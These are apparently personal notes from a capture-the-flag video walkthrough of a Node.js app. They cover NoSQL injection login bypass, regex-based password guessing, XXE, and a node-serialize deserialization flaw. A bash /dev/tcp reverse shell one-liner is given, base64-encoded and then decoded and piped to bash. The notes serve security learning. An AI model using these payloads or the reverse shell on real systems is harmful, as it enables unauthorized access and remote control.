# Takeaways 
#regex #python #xxe #noSQLi 
- Video https://www.youtube.com/watch?v=ahzOprfN--Y
- Node.js is running express framework
	- Like flask or django for python
- A lot of node.js applications do not use SQL
-  PHP is common with LAMP stack
-  Node.js is all about the MEAN stack
	- MongoDB
	- Express framework
	- Angular
	- Node.js
- Uses no SQL
- Often can not do noSQLi when content-type is set to `application/x-www-form-urlencoded`
- Try converting to `application/json`
- Make payload json
- i.e `{"user":"admin", password: "password1"}`
- With noSQLi 
```json
{"user":"admin", "password":
	{
		"$ne":"password1"
	}
}
```
- We are saying login if user == admin and password != password1
- If this kind of vulnerability exist, we can work out the password by using regex
- i.e:
```json
{"user":"admin", "password":
	{
		"$regex":"^c"
	}
}
```
- If the password starts with a "c" we will log in
- Repeat process again but with `$regex:"^cb"`, and if u log in u know the password starts with cb
- Write a script to do this automatically to work out the password
- **Python Tip** - Can use a different type of fstring
```python
string = "Text from string one"
string2 = "Text from string two - %s" % string

print(string2)
# Will output Text from "string two - Text from string one"
```
- When using requests library, can use `json=data` instad of `data=data` and python will automatically set the content-type header to `application/json`
- In regex `.*` means anything
- Can use `string.ascii_letters` from the `string` library to get all ascii characters
- When dealing with xml try an xml Entity Injection (XXE)
- [Pyaload all the things](https://github.com/swisskyrepo/PayloadsAllTheThings) is a great resource 
- Start basic with something like printing a name as application may be install preventing u from reading files
- In node.js the mail files are usually either:
	- app.js
	- server.js
	- main.js
- Check node imports for vulnerable dependencies
- In this case the vulnerable module was node-serialize
- Googling for this vulnerability bring up a payload to use
- The issue was insecure desericalization
```js
c = serialize.unserialize(c) // Where c was the users cookie - Insecure
c = JSON.parse(JSON.stringify(c)) // Secure way
```
- RCE was obtained by putting a malicious payload inside the cookie
- When seeting up reverse shell payload and u know there is going to be url encoding, convert reverse shell to base64
- Do this anythime special characters may be a problem
- Add extra white space to get rid of `+` character in base64 output
- `echo -n 'bash -i  >& /dev/tcp/<ip>/<port>  0>&1' | base64`
- To activate payload do: `echo -n <base64 string> | base64 -d | bash`
- Can view bson documents using `bsondump`
- Can use a tool called `jq` to prettyify json in the terminal
- Always test for IDOR